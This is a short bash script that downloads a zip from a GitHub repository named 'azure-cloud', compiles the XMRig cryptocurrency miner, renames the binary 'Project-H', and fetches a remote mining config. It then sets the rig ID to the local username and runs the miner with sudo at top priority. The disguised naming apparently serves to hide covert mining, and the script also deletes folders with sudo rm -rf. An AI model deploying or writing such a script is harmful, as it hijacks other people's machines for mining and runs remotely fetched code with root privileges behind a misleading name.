#!/bin/bash

export TZ=America/Sao_Paulo
export LOCAL=$(cat $(find /home -name home.file))
data=$(date +"%d-%m-%Y_%H:%M:%S")
cd $LOCAL
if [ ! -e "AAA/build/Project-H" ]; then

   if [ -e "AAA" ]; then
      sudo rm -rf AAA
   fi

   sudo ./install.sh
   
   wget https://github.com/U117A/azure-cloud/raw/master/AAA.zip
   unzip AAA.zip
   rm -rf AAA.zip
   cd AAA
   mkdir build
   cd build
   cmake ..
   make
   mv xmrig Project-H
   wget https://raw.githubusercontent.com/U117A/scripts/master/config.json
else
   cd AAA/build
   if [ -e "config.json" ]; then
      sudo rm -rf config.json
      sudo wget https://raw.githubusercontent.com/U117A/scripts/master/config.json
   fi
fi
user=${LOCAL/'/home/'}
sudo sed -i 's/"rig-id":.*/"rig-id": "'$user'",/' config.json
sudo nice -n -20 ./Project-H
